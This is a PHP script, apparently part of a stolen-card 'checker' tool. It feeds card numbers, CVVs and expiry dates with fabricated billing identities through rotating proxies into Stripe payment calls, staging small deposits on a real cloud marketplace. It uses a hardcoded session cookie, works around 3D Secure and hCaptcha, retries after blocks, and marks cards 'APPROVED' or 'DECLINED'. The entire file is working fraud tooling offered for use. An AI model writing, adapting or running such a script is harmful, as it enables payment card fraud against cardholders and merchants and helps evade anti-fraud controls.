<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&billing_details[name]='.$fake->first.'+'.$fake->last.'&billing_details[email]='.urlencode($fake->email).'&billing_details[address][country]=US&billing_details[address][line1]=ny+10&billing_details[address][city]=new+york&billing_details[address][postal_code]=10012&billing_details[address][state]=NY&guid=NA&muid=NA&sid=NA&key=pk_live_51JqNQYHSshR0IOtvfpFJ335VCKxHeyzKzGT8XaWMNvt5ye74VXApsofamVwZN3Ec2H9Y9Ap5WsVlVwxgnEL1Ys7R00rbTg3ky9&payment_user_agent=stripe.js%2F63fd7ebb3%3B+stripe-js-v3%2F63fd7ebb3%3B+checkout';

$headers = [
	'user-agent: '.$this->curlx->userAgent().''
];

$r1 = $this->curlx->Post('https://api.stripe.com/v1/payment_methods', $data, $headers, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$pm = $json_r1->id;

$data = '';

$headers = [
	'content-type: application/json',
	'cookie: _ga=GA1.1.1148582661.1676161869; __utmc=205814159; __utmz=205814159.1676161871.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __stripe_mid=4335f969-ce8a-4997-9aa5-182087a3de28119b04; session=.eJxtjsFOwzAQRP_F57pq4rA4PVWIHioQv2DZu5vEamJHjn0AxL9jISJx4DB7mKfZmU-BE-M9lmw8ibPAspm3a3dVT-PDdLu_vD6Lg8AYBp8WJsOL9bM451T4IMiTQbtmnOxu_XIBAWZoP3IOl9WunOp5T2U7YlzqvzmOI5MPeyqm0eDsOWTDwbqZ6S-Z4vavX8rPYoYTQjOAZA0sOzyR7N2gJLQWKyOghmpn2TjtEaU6oE6jBN1q2TndSOdsKx0p7B-bXlWJr28S6l0I.Y-gzow.O3OypQI43IIr1uHQNwV85M09ahk; __utma=205814159.1148582661.1676161869.1676161871.1676233092.2; __utmt=1; __stripe_sid=5564bbbc-4560-427d-b9b1-119873ccadc78144c2; _ga_P5VZBVFLDE=GS1.1.1676233089.3.1.1676233122.0.0.0; __utmb=205814159.2.10.1676233092; arp_scroll_position=0',
	'user-agent: '.$this->curlx->userAgent().'',
];

$r2 = $this->curlx->Post('https://marketplace.tensordock.com/createDepositFundsSession/5.00', $data, $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$session_id = $this->getstr($r2->body, '"id":"', '"');

if (empty($session_id)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = 'eid=NA&payment_method='.$pm.'&expected_amount=500&last_displayed_line_item_group_details[subtotal]=500&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_51JqNQYHSshR0IOtvfpFJ335VCKxHeyzKzGT8XaWMNvt5ye74VXApsofamVwZN3Ec2H9Y9Ap5WsVlVwxgnEL1Ys7R00rbTg3ky9';

$headers = [
	'user-agent: '.$this->curlx->userAgent().''
];

$r3 = $this->curlx->Post('https://api.stripe.com/v1/payment_pages/'.$session_id.'/confirm', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

if (strpos($r3->body, 'verify_challenge') !== false) {
	$empty = 'Third Request Contains HCaptcha!';

	goto start;
}

$client_secret = $this->getstr($r3->body, 'client_secret": "', '"');

$pi_id = explode('_secret_', $client_secret)[0];

if (strpos($r3->body, 'requires_action') !== false) {
	$stripe_js = $this->getstr($r3->body, 'stripe_js": "', '"');
	$three_d_src = $this->getstr($r3->body, 'three_d_secure_2_source": "', '"');
	$server_transaction_id = $this->getstr($r3->body, 'server_transaction_id": "', '"');

	if (!empty($three_d_src)) {
		$data = 'source='.$three_d_src.'&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22'.base64_encode('{"threeDSServerTransID":"'.$server_transaction_id.'"}').'%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22tr-TR%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22864%22%2C%22browserScreenWidth%22%3A%221536%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22'.urlencode($this->curlx->userAgent()).'%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51JqNQYHSshR0IOtvfpFJ335VCKxHeyzKzGT8XaWMNvt5ye74VXApsofamVwZN3Ec2H9Y9Ap5WsVlVwxgnEL1Ys7R00rbTg3ky9';

		$vbv = $this->curlx->Post('https://api.stripe.com/v1/3ds2/authenticate', $data, null, $cookie, $server['proxy']);

		if (!$vbv->success) goto start;

		$vbv_state = json_decode($vbv->body)->state;

		if ($vbv_state == 'failed' || $vbv_state == 'challenge_required') {
			$err = $vbv_state == 'failed' ? 'Authenticate Failed' : 'OTP Code Required';

			$status = ['emoji' => '✅', 'status' => 'APPROVED', 'msg' => "CVV CARD - 3D Secure -> $err!"];

			goto end;
		}
	} elseif (!empty($stripe_js)) $this->curlx->Get($stripe_js, null, $cookie, $server['proxy']);

	$r3 = $this->curlx->Get('https://api.stripe.com/v1/payment_intents/'.$pi_id.'?key=pk_live_51JqNQYHSshR0IOtvfpFJ335VCKxHeyzKzGT8XaWMNvt5ye74VXApsofamVwZN3Ec2H9Y9Ap5WsVlVwxgnEL1Ys7R00rbTg3ky9&is_stripe_sdk=false&client_secret='.$client_secret, null, $cookie, $server['proxy']);

	if (!$r3->success) goto start;

	if (strpos($r3->body, 'verify_challenge') !== false) {
		$empty = 'Fourth Request Contains HCaptcha!';

		goto start;
	}
}

$json_r3 = json_decode($r3->body);

if (isset($json_r3->error) || isset($json_r3->last_payment_error)) {
	$status = $this->response->ErrorHandler($json_r3->error ?? $json_r3->last_payment_error);

	goto end;
}

file_put_contents('strc_r3_no_err.txt', $r3->body . PHP_EOL, FILE_APPEND);

$status = $this->response->Stripe($r3->body);

end: